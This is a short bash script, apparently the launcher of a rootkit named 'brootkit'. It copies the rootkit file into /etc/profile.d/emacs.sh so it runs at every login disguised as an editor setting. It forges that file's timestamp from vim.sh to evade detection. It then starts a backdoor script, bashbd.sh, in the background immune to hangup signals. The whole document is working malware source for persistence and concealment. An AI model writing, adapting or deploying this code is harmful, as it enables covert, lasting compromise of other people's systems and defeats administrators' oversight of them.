#!/bin/bash

function br_rootkit()
{
	cp brootkit.sh /etc/profile.d/emacs.sh
	touch -r /etc/profile.d/vim.sh /etc/profile.d/emacs.sh
}

function br_hookhup()
{
        :
}

function main()
{
        if ! type nohup >/dev/null; then
                nohup ./bashbd.sh > /dev/null 2>&1
        else
                trap br_hookhup SIGHUP
                ./bashbd.sh > /dev/null 2>&1 &
        fi
}

main
